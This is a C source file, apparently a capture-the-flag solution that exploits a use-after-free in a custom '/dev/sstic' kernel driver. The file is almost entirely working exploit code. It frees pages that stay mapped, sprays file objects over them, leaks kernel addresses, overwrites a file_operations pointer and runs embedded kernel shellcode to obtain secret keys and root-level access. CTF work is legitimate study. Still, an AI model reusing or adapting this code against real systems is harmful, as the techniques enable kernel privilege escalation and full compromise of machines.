#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#define BASEADDR ((void *)(0x88000000ULL))

static int sstic_alloc_region(int fd, int size, int prot) {
    int cmd[6] = { size, prot };
    if(ioctl(fd, 0xC0185300uLL, cmd) < 0) {
        printf("failed to ioctl alloc_region: %d\n", errno);
        return -1;
    }
    return cmd[2];
}

static int sstic_del_region(int fd, int addr) {
    int cmd[6] = { addr };
    if(ioctl(fd, 0xC0185301uLL, cmd) < 0) {
        printf("failed to ioctl del_region: %d\n", errno);
        return -1;
    }
    return 0;
}

static void my_system(const char *cmd) {
    /* normal system() calls fork() which would call dup_mm and sstic_vm_open... */
    int pid = vfork();
    if(pid == 0) {
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        exit(1);
    } else if(pid < 0) {
        printf("vfork failed\n");
        return;
    }
    int status = 0;
    waitpid(pid, &status, 0);
}

static void getkey(int fd, uint64_t ident) {
    uint64_t buf[3];
    buf[0] = ident;
    if(ioctl(fd, 0xC0185304uLL, buf) < 0) {
        printf("failed to ioctl for key %016lx: %d\n", ident, errno);
        close(fd);
        return;
    }
    close(fd);
    printf("key for %016lx: ", ident);
    unsigned char *c = (unsigned char *)&buf[1];
    for(int i=0; i<16; i++) {
        printf("%02x", c[i]);
    }
    printf("\n");
}

#define MAX_REGIONS 2 // 512
int regions[MAX_REGIONS];
uint8_t *vaddrs[MAX_REGIONS];

int main() {
    int fd = open("/dev/sstic", 2);
    int res;
    if(fd < 0) {
        printf("failed to open /dev/sstic\n");
        return -1;
    }

    /** Stage 1: Allocate a lot of regions **/
    const int npages = 32; // must be a power of two
    const int prot = PROT_READ | PROT_WRITE;
    const int halfalloc = (npages << 12) >> 1;
    int i;
    int num_regions;

    for(i=0; i<MAX_REGIONS; i++) {
        int addr = sstic_alloc_region(fd, npages, prot);
        if(addr < 0) {
            break;
        }
        printf("region %d: %x\n", i, addr);
        regions[i] = addr;
    }
    num_regions = i;

    /** Stage 2: mmap all the regions into memory so they can be manipulated with vm_* functions **/
    for(i=0; i<num_regions; i++) {
        uint8_t *vaddr = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, regions[i]);
        if(vaddr == MAP_FAILED) {
            num_regions = i;
            break;
        }
        for(int j=0; j<(npages<<12); j += (1<<12)) {
            memset(vaddr + j, 0xc0 + (j >> 12), 1<<12);
        }
        munmap(vaddr, npages << 12);

        vaddr = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, regions[i]);
        if(vaddr == MAP_FAILED) {
            num_regions = i;
            break;
        }
        printf("vaddr %d: %p\n", i, vaddr);
        vaddrs[i] = vaddr;
    }

    /** Stage 3: Create a child process that will help us decrement the reference counts. **/
    int p2c[2];
    int c2p[2];
    res = pipe(p2c);
    if(res < 0) {
        printf("perror failed: %d\n", errno);
        return -1;
    }
    res = pipe(c2p);
    if(res < 0) {
        printf("perror failed: %d\n", errno);
        return -1;
    }
    int pid = fork();
    if(pid < 0) {
        printf("fork failed: %d\n", errno);
        return -1;
    }
    if(!pid) {
        char msg;
        read(p2c[0], &msg, 1);
        write(c2p[1], &msg, 1);
        // After sstic_del_region, we free again in order to cause the pages to be freed
        // while still accessible by the parent process.
        for(i=0; i<num_regions; i++) {
            res = munmap(vaddrs[i] + halfalloc, halfalloc);
            if(res < 0)
                printf("child munmap: %d\n", res);
        }
        /* Don't exit. This keeps the first half of the pages alive. */
        read(p2c[0], &msg, 1);
        write(c2p[1], &msg, 1);
        _exit(0);
    }

    /** Stage 4: Split each block, placing split information into the phy_region. */
    for(i=0; i<num_regions; i++) {
        res = munmap(vaddrs[i] + halfalloc, halfalloc);
        if(res < 0)
            printf("parent munmap: %d\n", res);
    }

    /** Stage 5: Trigger the bug in vm_open. This "re-splits" the phy_region because the
        split information was not cleared in the previous split.
        The resplit causes the resulting half-block to contain pages from the second half
        of the region, instead of the first half as intended. **/
    /* mremap calls copy_vma which eventually calls sstic_vm_open */
    for(i=0; i<num_regions; i++) {
        uint8_t *vaddr2 = mremap(vaddrs[i], halfalloc, halfalloc, MREMAP_MAYMOVE | MREMAP_FIXED, vaddrs[i] + halfalloc);
        if(vaddr2 == MAP_FAILED)
            printf("parent mremap: %p\n", vaddr2);
    }

    /** Stage 6. Fault in the pages from the second half of the region. We have to do this
        now, while the reference count is still positive and the page is still marked as
        being from this type of allocation.

        NOTE: this must be the first time we're faulting in this allocation; if we fault before
        the mremap, we'll lock in mappings from the wrong half of the region. **/
    for(i=0; i<num_regions; i++) {
        for(int j=0; j<halfalloc; j += (1<<12)) {
            vaddrs[i][j + halfalloc] = 0xee;
        }
    }

    /** Stage 7. Decrement reference counts. **/
    for(i=0; i<num_regions; i++) {
        sstic_del_region(fd, regions[i]);
    }

    /** Stage 8. Decrement reference counts on the second half again, freeing the pages.
        Our mmap and our faulted pages should have two references, hence why we need to
        decrement the reference count twice to achieve our free.
        The child process won't exit now, because exiting would free the first half
        of the pages, which we don't have leaked. **/
    char c;
    write(p2c[1], "!", 1);
    read(c2p[0], &c, 1);

    // Give the system a moment to clear freed pages
    printf("pause for cleanup\n");
    sleep(2);

    /** Stage 9. At this point, vaddr + 0x10000-0x18000 are free pages in the kernel.
        Allocate stuff from the kernel to go on top - we can overwrite these to win. **/
    #define NUMFDS 100
    int devfds[NUMFDS];
    int numfds;
    for(i=0; i<NUMFDS; i++) {
        int fd;
        if(i % 2 == 0) {
            fd = open("/etc/passwd", O_RDONLY);
        } else {
            fd = open("/dev/sstic", 2);
        }
        printf("%d ", fd);
        if(fd < 0)
            break;
        devfds[i] = fd;
    }
    printf("\n");
    numfds = i;

    uint64_t kernelbase = 0;
    uint64_t ssticbase = 0;
    for(i=0; i<num_regions; i++) {
        int64_t *ptr = (int64_t *)(vaddrs[i] + halfalloc);
        for(int j=0; j<(halfalloc >> 3) - 32; j++) {
            if(ptr[j+11] < 0 && ptr[j+12] < 0 && ptr[j+11] == ptr[j+12] /* list in f_pos_lock */
            && ptr[j+26] < 0 && ptr[j+27] < 0 && ptr[j+26] == ptr[j+27] /* f_ep_links */
            && ptr[j+28] < 0 && ptr[j+29] < 0 && ptr[j+28] == ptr[j+29] /* f_ep_links */
            ) {
                if((ptr[j+5] & 0xfff) == 0x780) {
                    // shmem_file_operations
                    kernelbase = ptr[j+5] - 0x1395780uL;
                } else if((ptr[j+5] & 0xfff) == 0x120) {
                    // sstic_file_operations
                    ssticbase = ptr[j+5] - 0x2120uL;
                }
            }
        }
    }
    printf("kernelbase=%lx ssticbase=%lx\n", kernelbase, ssticbase);

    int64_t *fileptr = NULL;
    int64_t filevaddr;
    int64_t backup1, backup5;
    for(i=0; i<num_regions; i++) {
        int64_t *ptr = (int64_t *)(vaddrs[i] + halfalloc);
        for(int j=0; j<(halfalloc >> 3) - 32; j += (4096 >> 3)) {
            if(ptr[j+11] < 0 && ptr[j+12] < 0 && ptr[j+11] == ptr[j+12] /* list in f_pos_lock */
            && ptr[j+26] < 0 && ptr[j+27] < 0 && ptr[j+26] == ptr[j+27] /* f_ep_links */
            && ptr[j+28] < 0 && ptr[j+29] < 0 && ptr[j+28] == ptr[j+29] /* f_ep_links */
            ) {
                if((ptr[j+5] & 0xfff) == 0x780 || (ptr[j+5] & 0xfff) == 0x120) {
                    int64_t vaddr = ptr[j+28] - (28 << 3);
                    printf("Overwriting file_operations for file %p (vaddr %lx)\n", &ptr[j], vaddr);
                    backup1 = ptr[j+1];
                    backup5 = ptr[j+5];
                    ptr[j+1] = kernelbase + 0x59ad0; // set_memory_x
                    ptr[j+5] = vaddr;
                    fileptr = &ptr[j];
                    filevaddr = vaddr;
                    break;
                }
            }
        }
        if(fileptr)
            break;
    }
    if(!fileptr) {
        printf("Bad luck - no good file pointers to overwrite.\n");
        return -1;
    }

    int filefd = -1;
    for(i=0; i<numfds; i++) {
        res = lseek64(devfds[i], 1, SEEK_SET);
        if(res == 0) {
            /* we get -1 for sstic and 1 for /etc/passwd */
            printf("file %d matches\n", devfds[i]);
            filefd = devfds[i];
            break;
        }
    }
    if(filefd == -1) {
        printf("Bad luck - no file descriptor matched?\n");
        return -1;
    }

    char buf[] = "SH\213\35O\0\0\0\277\0\0\0\0H\2135K\0\0\0H\213\266\330&\0\0H\203\306(H\215\203`\36\77\0\377\320H1\377H\215\203\240\237\b\0\377\320H\211\307H\215\203p\235\b\0\377\320H\2135\30\0\0\0H\213\266\330&\0\0H\203\306(H\211\360[\303AAAAAAAABBBBBBBB";
    char backup800[sizeof(buf)];
    memcpy(backup800, (char *)fileptr + 0x800, sizeof(buf));
    *(int64_t *)&buf[sizeof(buf)-17] = kernelbase;
    *(int64_t *)&buf[sizeof(buf)-9] = ssticbase;
    memcpy((char *)fileptr + 0x800, buf, sizeof(buf) - 1);
    fileptr[1] = filevaddr + 0x800;

    printf("triggering shellcode\n");
    long sres = lseek64(filefd, 1, SEEK_SET);
    printf("shellcode responded %lx\n", sres);

    // Restore kernel structures to allow a clean exit
    fileptr[1] = backup1;
    fileptr[5] = backup5;
    memcpy((char *)fileptr + 0x800, backup800, sizeof(buf));

    // I had to get the keys one-at-a-time, presumably due to kernel instability.
//     getkey(fd, 0xD603C7E177F13C40);
//     getkey(fd, 0xED6787E18B12543E);
    getkey(fd, 0xFBDF1AF71DD4DDDA);

    my_system("/bin/ls -la /root");

    // Allow the child process to exit
    write(p2c[1], "!", 1);
    read(c2p[0], &c, 1);
    int status = 0;
    waitpid(pid, &status, 0);
}
